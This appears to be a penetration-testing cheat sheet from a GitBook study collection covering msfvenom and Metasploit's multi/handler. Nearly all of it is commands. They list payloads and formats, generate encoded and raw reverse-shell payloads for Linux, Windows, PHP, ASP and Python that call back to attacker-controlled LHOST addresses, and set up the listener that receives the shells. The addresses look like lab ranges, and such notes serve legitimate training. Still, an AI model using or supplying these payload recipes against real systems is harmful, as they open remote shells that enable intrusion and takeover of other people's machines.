# Msfvenom

**msfvenom**

* `msfvenom -l payloads`
* **Output formats**
  * `msfvenom --list formats`
* **Encoders**
  * `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`
  * \-f -> format
  * \-e -> encoding
* **Handlers**
  * `msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php`
  * Convert this php file to valid php\
    Comments removed from the beginning of the file.\
    End tag added
  * For incoming connection:\
    `use exploit/multi/handler`\
    `set payload linux/x86/meterpreter/reverse_tcp`\
    `run`
* Other Payloads
  * Linux
    * `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
    * `msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`
  * Windows
    * `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
  * PHP
    * `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
  * ASP
    * `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
  * Python
    * `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
* Meterpreter
* Multi Handler
  * `msfconsole`
  * `use multi/handler`
  * `set PAYLOAD <payload>`
  * `set LHOST <listen-address>`
  * `set LPORT <listen-port>`
  * exploit -j

![metasploit multi handler](<../../../.gitbook/assets/image (6).png>)

